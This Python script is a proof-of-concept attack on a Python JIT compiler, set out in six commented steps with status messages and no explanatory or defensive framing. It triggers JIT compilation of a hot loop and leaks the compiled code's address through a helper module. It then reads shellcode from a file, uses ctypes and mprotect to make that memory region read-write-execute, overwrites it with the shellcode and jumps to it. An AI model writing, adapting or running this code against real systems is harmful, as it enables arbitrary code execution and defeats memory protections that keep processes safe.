import ctypes
import mmap
import jitexecleak

PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
PAGE_SIZE = 0x1000

# Step 1: JIT-triggering hot function
def hot_loop(x):
    total = 0
    for _ in range(100_000):
        total += x * 3
        total ^= (total >> 2)
    return total

print("[*] Triggering JIT...")
for _ in range(1000):
    hot_loop(42)

# Step 2: Leak JIT address
jit_addr = jitexecleak.leak_executor_jit(hot_loop)
print(f"[+] Leaked executor->jit_code: 0x{jit_addr:x}")

# Step 3: Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

shellcode_size = len(shellcode)
remap_size = ((shellcode_size + PAGE_SIZE - 1) // PAGE_SIZE) * PAGE_SIZE
print(f"[*] Loaded {shellcode_size} bytes of shellcode")

# Step 4: mprotect() to make RWX
libc = ctypes.CDLL("libc.so.6")
aligned = jit_addr & ~(PAGE_SIZE - 1)
res = libc.mprotect(ctypes.c_void_p(aligned), remap_size, PROT_READ | PROT_WRITE | PROT_EXEC)

if res != 0:
    raise OSError("[-] mprotect failed")

print("[*] RWX permission granted for JIT region")

# Step 5: Overwrite with shellcode
ctypes.memmove(jit_addr, shellcode, shellcode_size)
print("[*] Shellcode written to JIT region")

# Step 6: Execute
print("[*] Jumping to shellcode...")
func = ctypes.CFUNCTYPE(None)(jit_addr)
func()
